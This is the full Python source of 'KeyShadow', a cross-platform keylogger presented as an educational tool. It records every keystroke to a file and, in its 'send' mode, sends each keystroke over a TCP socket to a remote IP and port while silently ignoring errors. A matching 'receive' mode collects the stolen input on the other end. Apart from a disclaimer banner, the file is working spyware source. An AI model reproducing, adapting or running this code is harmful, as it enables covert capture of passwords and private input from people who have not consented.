#!/usr/bin/env python3
"""
KeyShadow: An Educational Cross-Platform Keylogger for Ethical Use

Authors:
trmxvibs
"""

import argparse
import os
import sys
import socket
from datetime import datetime
from pynput.keyboard import Key, Listener

LOGO = r"""
 _  __           _____ _           _               
| |/ /___ _   _ /  ___| |__   __ _| |_ ___  _ __   
| ' // _ \ | | |\___ \| '_ \ / _` | __/ _ \| '__|  
| . \  __/ |_| | ___) | | | | (_| | || (_) | |     
|_|\_\___|\__, | |____/|_| |_|\__,_|\__\___/|_|     
         |___/                                  
"""

WARNING = """
[!] WARNING:
This tool is for EDUCATIONAL and ETHICAL purposes only.
Use ONLY on your own device or with EXPRESS PERMISSION.
Unauthorized use may be ILLEGAL.
Authors and contributors assume NO responsibility for misuse.
"""

DEFAULT_LOG_FILE = "keylog.txt"
DEFAULT_PORT = 8080

class KeyShadow:
    def __init__(self, args):
        self.mode = args.mode
        self.log_file = args.logfile
        self.remote_ip = args.remote_ip
        self.remote_port = args.remote_port
        self.listen_port = args.listen_port
        self.stop_flag = False

    def start(self):
        print(LOGO)
        print(WARNING)
        print(f"[+] Mode: {self.mode}")
        if self.mode == "local":
            print(f"[+] Logging locally to: {os.path.abspath(self.log_file)}")
            self.log_locally()
        elif self.mode == "send":
            if not self.remote_ip:
                print("[-] Remote IP required for send mode. Use --remote-ip.")
                sys.exit(1)
            print(f"[+] Sending logs to {self.remote_ip}:{self.remote_port}")
            self.log_and_send()
        elif self.mode == "receive":
            print(f"[+] Receiving logs on port {self.listen_port}")
            self.receive_logs()
        else:
            print("[-] Invalid mode selected.")
            sys.exit(1)

    def log_locally(self):
        def on_press(key):
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.log_file, "a", encoding="utf-8") as f:
                try:
                    f.write(f"{now} - {key.char}\n")
                except AttributeError:
                    f.write(f"{now} - [{key}]\n")

        def on_release(key):
            if key == Key.esc:
                print("\n[+] ESC pressed, stopping KeyShadow.")
                return False

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
        print(f"[+] Logging stopped. Log file saved at: {os.path.abspath(self.log_file)}")

    def log_and_send(self):
        def on_press(key):
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = ""
            try:
                log_entry = f"{now} - {key.char}\n"
            except AttributeError:
                log_entry = f"{now} - [{key}]\n"
            # Save locally as backup
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
            # Send to remote server
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.remote_ip, self.remote_port))
                    s.sendall(log_entry.encode())
            except Exception as e:
                # Ignore sending errors to keep logging going
                pass

        def on_release(key):
            if key == Key.esc:
                print("\n[+] ESC pressed, stopping KeyShadow.")
                return False

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
        print(f"[+] Logging stopped. Local backup saved at: {os.path.abspath(self.log_file)}")

    def receive_logs(self):
        print(f"[+] Listening for logs on 0.0.0.0:{self.listen_port} (press Ctrl+C to stop)")
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(('0.0.0.0', self.listen_port))
                server.listen(5)
                while True:
                    conn, addr = server.accept()
                    with conn:
                        data = conn.recv(4096)
                        if data:
                            log_line = data.decode(errors="ignore")
                            with open(self.log_file, "a", encoding="utf-8") as f:
                                f.write(log_line)
                            print(f"[+] Received log from {addr[0]}: {log_line.strip()}")
        except KeyboardInterrupt:
            print("\n[+] Receiver stopped by user.")
        except Exception as e:
            print(f"[-] Error in receiver: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="KeyShadow: Educational Cross-Platform Keylogger",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument(
        "-m", "--mode",
        choices=["local", "send", "receive"],
        required=True,
        help="Operating mode: local (log to file), send (send logs to IP:port), receive (receive logs from network)"
    )
    parser.add_argument(
        "-l", "--logfile",
        default=DEFAULT_LOG_FILE,
        help="Path to the log file"
    )
    parser.add_argument(
        "--remote-ip",
        help="Remote IP address to send logs (send mode only)"
    )
    parser.add_argument(
        "--remote-port",
        type=int,
        default=DEFAULT_PORT,
        help="Remote port to send logs (send mode only)"
    )
    parser.add_argument(
        "--listen-port",
        type=int,
        default=DEFAULT_PORT,
        help="Port to listen for incoming logs (receive mode only)"
    )
    args = parser.parse_args()
    keyshadow = KeyShadow(args)
    keyshadow.start()

if __name__ == "__main__":
    main()
